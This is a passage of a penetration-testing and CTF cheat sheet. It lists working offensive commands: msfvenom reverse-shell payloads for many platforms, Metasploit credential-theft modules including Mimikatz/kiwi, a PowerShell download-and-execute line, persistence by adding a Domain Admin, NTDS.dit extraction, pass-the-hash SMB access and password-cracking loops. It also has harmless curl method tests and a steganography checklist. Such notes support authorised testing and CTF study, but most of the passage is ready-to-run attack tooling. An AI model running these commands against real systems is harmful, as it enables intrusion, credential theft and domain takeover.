use auxiliary/scanner/oracle/oracle_login
```

- Metasploit Oracle Login Module

```bash
use exploit/multi/script/web_delivery
```

- Metasploit powershell payload delivery module

```bash
post/windows/manage/powershell/exec_powershell
```

- Metasploit upload and run powershell script through a session

```bash
use exploit/multi/http/jboss_maindeployer
```

- Metasploit JBOSS deploy

```bash
use exploit/windows/mssql/mssql_payload
```

- Metasploit MSSQL payload

```bash
run post/windows/gather/win_privs
```

- Metasploit show privileges of current user

```bash
use post/windows/gather/credentials/gpp
```

- Metasploit grab GPP saved passwords

```bash
load kiwi
```

```bash
creds_all
```

- Metasploit load Mimikatz/kiwi and get creds

```bash
run post/windows/gather/local_admin_search_enum
```

- Idenitfy other machines that the supplied domain user has administrative access to

```bash
set AUTORUNSCRIPT post/windows/manage/migrate
```

### **Meterpreter Payloads**

```bash
msfvenom –l
```

- List options

### **Binaries**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
```

### **Web Payloads**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php
```

- PHP

```bash
set payload php/meterpreter/reverse_tcp
```

- Listener

```bash
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

- PHP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

- ASP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

- JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

- WAR

### **Scripting Payloads**

```bash
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
```

- Python

```bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
```

- Bash

```bash
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

- Perl

### **Shellcode**

For all shellcode see ‘msfvenom –help-formats’ for information as to
valid parameters. Msfvenom will output code that is able to be cut and
pasted in this language for your exploits.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
```

### **Handlers**

Metasploit handlers can be great at quickly setting up Metasploit to
be in a position to receive your incoming shells. Handlers should be in
the following format.

```
exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z
```

An example is:

```
msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
```

# **Powershell**

**Execution Bypass**

```bash
Set-ExecutionPolicy Unrestricted
./file.ps1
```

```bash
Import-Module script.psm1
Invoke-FunctionThatIsIntheModule
```

```bash
iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)
```

**Powershell.exe blocked**

```bash
Use ‘not powershell’ [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)
```

**Persistence**

```bash
net user username "password" /ADD
```

```bash
net group "Domain Admins" %username% /DOMAIN /ADD
```

**Gather NTDS.dit file**

```bash
ntdsutil
```

```bash
activate instance ntds
```

```bash
ifm
```

```bash
create full C:\ntdsutil
```

```bash
quit
```

```bash
quit
```
# **Shells & Reverse Shells** done

## curl

Download a file:

```fundamental
curl somesite.com/somefile.txt -o somefile.txt
```

Test a web server for various HTTP methods:

```fundamental
curl -i -X TRACE somesite.com

curl -i -X OPTIONS somesite.com

curl -i -X PUT somesite.com/somefile.txt -d 'pentest' -H 'Content-Type: text/plain'

curl -i somesite.com -T somefile.pdf -H 'Content-Type: application/pdf'

curl -i -X FAKEMETHOD somesite.com
```

Test a web server for a cross-site tracing (XST) attack:

```fundamental
curl -i -X TRACE -H 'XST: XST' somesite.com
```

Test a web server for an HTTP method overriding attack:

```fundamental
curl -i -X TRACE -H 'X-HTTP-Method: TRACE' somesite.com

curl -i -X DELETE -H 'X-HTTP-Method-Override: DELETE' somesite.com/somefile.txt

curl -i -X PUT -H 'X-Method-Override: PUT' somesite.com/somefile.txt -d 'pentest' -H 'Content-Type: text/plain'

curl -i -H 'X-Method-Override: PUT' somesite.com -T somefile.pdf -H 'Content-Type: application/pdf'
```

| Option | Description |
| --- | --- |
| -d | Sends the specified data in a POST request to the HTTP server |
| -H | Extra header to include in the request when sending HTTP to a server |
| -i | Include the HTTP response headers in the output |
| -k | Proceed and operate server connections otherwise considered insecure |
| -o | Write to file instead of stdout |
| -T | Transfers the specified local file to the remote URL, same as PUT method |
| -v | Make the operation more talkative |
| -x | Use the specified proxy (\[protocol://\]host\[:port\]) |
| -X | Specifies a custom request method to use when communicating with the HTTP server |

For more options run `man curl` or `curl -h`.

| HTTP Request Methods |
| --- |
| GET |
| HEAD |
| POST |
| PUT |
| DELETE |
| CONNECT |
| OPTIONS |
| TRACE |
| TRACK (MS IIS) |
| PATCH |

# Image Steganography Checklist (start)

## 1. type
Just to be sure what file you are facing with, check its type with `type filename.`

## 2. file
 Determine file type `file filename`
 
 ## 3. Strings
View all strings in the file with `strings filename`

`strings -n 7 -t x filename.png`

We use -n 7 for strings of length 7+, and -t x to view- their position in the file.

## 4. Exif
`exif image.png`

Check all image metadata. I would recommend [Jeffrey's Image Metadata Viewer](http://exif.regex.info/exif.cgi) for in-depth analysis.

## 5. Binwalk
We use binwalk to check image's for hidden embedded files.

My preferred syntax is `binwalk -Me filename.png`. `-Me` is used to recursively extract any files.

## 6. pngcheck
We can use pngcheck to look for optional/correct broken chunks. This is vital if the image appears corrupt.

Run `pngcheck -vtp7f filename.png` to view all info.

`v` is for verbose, `t` and `7` display tEXt chunks, `p` displays contents of some other optional chunks and `f` forces continuation after major errors are encountered.

Related write-ups:

[PlaidCTF 2015](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/forensics/png-uncorrupt)

[SECCON Quals 2015](https://github.com/ctfs/write-ups-2015/tree/master/seccon-quals-ctf-2015/stegano/steganography-2)

## 7. Explore Colour & Bit Planes
Images can be hidden inside of the colour/bit planes. Upload your image to this site [here](https://stegonline.georgeom.net/upload). On the image menu page, explore all options in the top panel (i.e. Full Red, Inverse, LSB etc).

Go to "Browse Bit Planes", and browse through all available planes.

If there appears to be some static at the top of any planes, try extracting the data from them in the "Extract Files/Data" menu.

Related write-ups:

[MicroCTF 2017](https://www.doyler.net/security-not-included/image-steganography-microctf-2017)

[CSAW Quals 2016](https://github.com/krx/CTF-Writeups/blob/master/CSAW%2016%20Quals/for250%20-%20Watchword/jk_actual_writeup.md)

[ASIS Cyber Security Contest Quals 2014](https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/blocks)

[Cybersocks Regional 2016](https://mokhdzanifaeq.github.io/2016/12/14/cybersocks-regional-2016-color-writeup/)

## 8. Extract LSB Data
As mentioned in step 6, there could be some static in bit planes. If so, navigate to the "Extract Files/Data" page, and select the relevant bits.

## 9. Check RGB Values
ASCII Characters/other data can be hidden in the RGB(A) values of an image.

Upload your image [here](https://stegonline.georgeom.net/upload), and preview the RGBA values. Try converting them to text, and see if any flag is found. It might be worth looking at just the R/G/B/A values on their own.

Related write-ups:

[MMA-CTF-2015](https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/stego/miyako-350)

## 10. Found a password? (Or not)
If you've found a password, the goto application to check should be [steghide](http://steghide.sourceforge.net/). Bear in mind that steghide can be used without a password, too.

You can extract data by running `steghide extract -sf filename.png`.

It might also be worth checking some other tools:

[OpenStego](https://www.openstego.com/)

[Stegpy](https://github.com/Baldanos/Stegpy)

[Outguess](https://outguess.rbcafe.com/)

[jphide](http://linux01.gwdg.de/~alatham/stego.html)

Related write-ups:

[Xiomara 2019](https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Forensics/Steghide)

[CSAW Quals 2015](https://github.com/ctfs/write-ups-2015/tree/master/csaw-ctf-2015/forensics/airport-200)

[BlackAlps Y-NOT-CTF (JFK Challenge)](https://blog.compass-security.com/2017/11/write-up-blackalps-y-not-ctf/)

## 11. Browse Colour Palette
If the PNG is in [type 3](https://www.w3.org/TR/PNG-Chunks.html%20for%20type%20specs), you should look through the colour palette.

This site has a feature for randomizing the colour palette, which may reveal the flag. You can also browse through each colour in the palette, if the flag is the same colour.

It may also be worth looking at the palette indexes themselves, as a string may be visible from there.

Related write-ups:

[Plain CTF 2014](https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/doge-stege)

# Image Steganography Checklist (done)

# Hash crack(password crack) start

## 1. John the ripper

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

## 2. hashcat

```
sha256 
hashcat --force -m 1400 --username hash.txt /usr/share/wordlists/rockyou.txt 
```

## 3. Crack zip Files

`fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' "file.zip"`

Note: Be careful with the quotes!

## 4. Crack openssl encrypted files

```
#!bin/bash
for password in $(cat /usr/share/wordlists/rockyou.txt)
do 
openssl enc -d -aes-256-cbc -a -in file.txt.enc -k $password -out $password-drupal.txt
done
```

After this you get one file for every Password tried. 

`ls -lS`

Sort them by size and find the one unique size. Or try to grep the content.


## 5. Pass the hash smb

With nt hash the `--pw-nt-hash` flag is needed, default is ntlm!

`pth-smbclient \\\\10.10.10.107\\$ -W <DOMAIN> -U <USER> -L <IP> --pw-nt-hash <HASH>`

List all shares on <HOST>.
  
`pth-smbclient \\\\10.10.10.107\\<SHAR> -W <DOMAIN> -U <USER> --pw-nt-hash <HASH>`

Connect to <SHARE>.
  
  ## 6. Hash Examples
<p>Likely just use hash-identifier for this but here are some example hashes:</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Example</td>
<td>8743b52063cd84097a65d1633f5c74f5</td>
</tr>
<tr>
<td>MD5 $PASS:$SALT Example</td>
<td>01dfae6e5d4d90d9892622325959afbe:7050461</td>
</tr>
<tr>
<td>MD5 $SALT:$PASS</td>
<td>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</td>
</tr>
<tr>
<td>SHA1 Hash Example</td>
<td>b89eaac7e61417341b710b727768294d0e6a277b</td>
</tr>
<tr>
<td>SHA1 $PASS:$SALT</td>
<td>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</td>
</tr>
<tr>
<td>SHA1 $SALT:$PASS</td>
<td>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</td>
</tr>
<tr>
<td>SHA-256</td>
<td>127e6fbfe24a750e72930c220a8e138275656b<br>
8e5d8f48a98c3c92df2caba935</td>
</tr>
<tr>
<td>SHA-256 $PASS:$SALT</td>
<td>c73d08de890479518ed60cf670d17faa26a4a7<br>
1f995c1dcc978165399401a6c4</td>
</tr>
<tr>
<td>SHA-256 $SALT:$PASS</td>
<td>eb368a2dfd38b405f014118c7d9747fcc97f4<br>
f0ee75c05963cd9da6ee65ef498:560407001617</td>
</tr>
<tr>
<td>SHA-512</td>
<td>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>
664fbb7adf72492e3c81ebd3e29134d9bc<br>
12212bf83c6840f10e8246b9db54a4<br>
859b7ccd0123d86e5872c1e5082f</td>
</tr>
<tr>
<td>SHA-512 $PASS:$SALT</td>
<td>e5c3ede3e49fb86592fb03f471c35ba13e8<br>
d89b8ab65142c9a8fdafb635fa2223c24e5<br>
558fd9313e8995019dcbec1fb58414<br>
6b7bb12685c7765fc8c0d51379fd</td>
</tr>
<tr>
<td>SHA-512 $SALT:$PASS</td>
<td>976b451818634a1e2acba682da3fd6ef<br>
a72adf8a7a08d7939550c244b237c72c7d4236754<br>
4e826c0c83fe5c02f97c0373b6b1<br>
386cc794bf0d21d2df01bb9c08a</td>
</tr>
<tr>
<td>NTLM Hash Example</td>
<td>b4b9b02e6f09a9bd760f388b67351e2b</td>
</tr>
</tbody>
</table>
  
  # Hash crack(password crack) done
  
  

  
  



